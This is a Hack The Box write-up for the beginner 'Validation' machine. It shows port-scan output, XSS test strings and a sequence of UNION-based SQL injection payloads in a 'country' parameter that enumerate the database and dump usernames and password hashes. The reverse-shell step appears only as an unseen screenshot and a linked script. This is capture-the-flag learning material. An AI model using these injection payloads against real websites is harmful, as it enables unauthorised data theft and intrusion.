---
layout: single
title: Validation - Hack The Box
excerpt: "Perfect for learning basic SQLi"
date: 2022-12-05
classes: wide
header:
  teaser: /assets/images/htb-writeup-validation/validation1.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - linux
  - SQLi
  - XSS
---

![](/assets/images/htb-writeup-validation/validation1.png)

Beginner machine with an SQLi in a static cookie and the country parameter.

## Portscan

```bash
Nmap scan report for 10.129.23.139
Host is up (0.050s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.48 (Debian)
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Let's check port 80
```bash
❯ whatweb http://10.129.23.139:80/
http://10.129.23.139/ [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[10.129.23.139], JQuery, PHP[7.4.23], Script, X-Powered-By[PHP/7.4.23]
```
PHP like programming language. Good to keep in mind

## Web 

It is vulnerable to HTML injection and XSS.
```bash
<h1>Testing HTML injection</h1>
<script>alert("XSS")</script>
```
How is data being sent? Time to use Burpsuite.
![](/assets/images/htb-writeup-validation/validation2.png)
```bash
burpsuite &> /dev/null &
disown //In order to make the process independent
```
First of all, the cookie given by the server is the same all the time for the input that we insert. We could abuse that copying the md5 hash created and pasting in the storage space (developer tools). You could try it. Static php cookie
![](/assets/images/htb-writeup-validation/validation3.png)
```bash
❯ echo -n 'm1l0js' | md5sum
f49775f4b37981eb269a05abccba27cf
```
Let's focus on the country parameter and test an SQLi. We need to know how many databases exist.
![](/assets/images/htb-writeup-validation/validation4.png)
After that, we are going to get as much information as possible
- username=m1l0js&country=Brazil' union select database()-- -
- username=m1l0js&country=Brazil' union select version()-- -
- username=m1l0js&country=Brazil' union select schema_name from information_schema.schemata-- 
- username=m1l0js&country=Brazil' union select table_name from information_schema.tables where table_schema="registration"-- -
- username=m1l0js&country=Brazil' union select column_name from information_schema.columns where table_schema="registration" and table_name="registration"-- -
- username=m1l0js&country=Brazil' union select group_concat(username,0x3a,userhash) from registration-- -

![](/assets/images/htb-writeup-validation/validation5.png)

These are hashes belonging to the users we have tested. This information is useless. But, can we upload files?
![](/assets/images/htb-writeup-validation/validation6.png)

We know that this website uses PHP. What if we try something?
![](/assets/images/htb-writeup-validation/validation7.png)
So now, it would be necessary to obtain a reverse shell

![](/assets/images/htb-writeup-validation/validation8.png)

I had automated all this. Check it
[validation.py](https://github.com/m1l0js/automationHTB/blob/main/validation.py)

Thanks for your time.

